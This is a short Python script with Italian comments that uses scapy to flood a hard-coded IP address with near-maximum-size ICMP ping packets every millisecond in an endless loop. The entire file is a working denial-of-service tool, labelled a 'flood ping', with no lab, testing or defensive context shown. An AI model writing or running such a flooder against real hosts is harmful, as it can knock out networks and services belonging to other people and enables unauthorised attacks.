from scapy.all import IP, ICMP, send
import time

target_ip = "172.32.1.2"
packet_size = 65500  # dimensione totale dati ICMP (payload)
interval = 0.001     # intervallo in secondi (1 ms)

# Calcolo payload per ottenere dimensione approssimativa pacchetto
# IP header = 20 bytes, ICMP header = 8 bytes
payload_size = packet_size - 20 - 8
payload = b'X' * payload_size  # riempi payload con 'X'

packet = IP(dst=target_ip)/ICMP()/payload

print(f"[+] Inizio flood ping su {target_ip} con pacchetti da {packet_size} byte ogni {interval*1000} ms")

try:
    while True:
        send(packet, verbose=0)
        time.sleep(interval)
except KeyboardInterrupt:
    print("\n[!] Flood ping interrotto dall'utente")
